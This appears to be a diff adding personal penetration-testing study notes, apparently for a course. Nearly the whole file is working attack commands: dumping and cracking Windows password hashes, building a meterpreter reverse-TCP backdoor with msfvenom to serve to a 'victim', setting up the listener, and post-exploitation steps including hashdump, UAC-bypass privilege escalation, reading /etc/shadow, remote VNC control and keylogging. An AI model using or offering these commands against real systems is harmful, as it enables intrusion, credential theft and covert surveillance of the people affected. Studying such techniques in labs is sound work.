@@ -1,0 +1,110 @@
+
+
+
+# To Dump Windows SAM file hashes
+
+Open Cmd
+
+pwDump7.exe          # give password hash 
+
+pwDump7.exe> hashes.txt     # store hash on file txt
+
+# In the hashes.txt file, replace the box symbols before each user ID 
+
+
+
+#ophcrack  to crack hash
+
+1)Open Opcrack.exe
+
+2)load pwdump file
+
+3)from table > vista free > install
+
+4)crack
+
+---------------------------------------------------------------------------
+
+#Rainbow crack
+Rcrack_gui.exe
+
+1) Load NTLM Hashes from PWDUMP File 
+
+2) Search Rainbow Tables 
+
+3)raibow table in winrtgen
+
+-----------------------------------------------------------------------------
+
+
+
+Create A Reverse TCP Connection
+
+
+# creates reverse TCP <backdoor)from linux machine, send this file to victim machine via Webserver/shared resource
+
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.10.11 LPORT=444 -o /root/Desktop/Test.exe
+
+mkdir /var/www/html/share 
+chmod -R 755 /var/www/html/share    
+chown -R www-data:www-data /var/www/html/share
+mv /root/Desktop/Test.exe /var/www/html/share
+
+service apache2 start
+
+
+
+
+#on Metesploite
+
+use multi/handler   
+set payload windows/meterpreter/reverse_tcp     
+set LHOST 10.10.10.11   
+set LPORT 444 
+
+run
+
+
+exploit -j -z      #( only use it if lisnter not working autmatic)
+
+
+
+
+#go windows and imstall from 
+http://10.10.10.11/share 
+
+--------------------------------------------------------------------------------
+
+Metasploite & meterpreter 
+
+
+Sysinfo
+getuid
+getsystem
+
+sessions –i 1
+
+ps  # show all process
+
+getpid # process id 
+
+
+Search –f  *.txt
+
+Cat /etc/shadow
+
+Download  <file name>
+
+Ls
+Cat
+Pwd
+
+Use  post/windows/gather/hashdump    # gather hash dump 
+
+use exploit/windows/local/bypassuac_fodhelper # privilage escalation corse 
+
+use exploite/widows/locall/bypassuac     # ejpt
+
+
+Run vnc    # remote control
+Keyscan_start    #keylogger
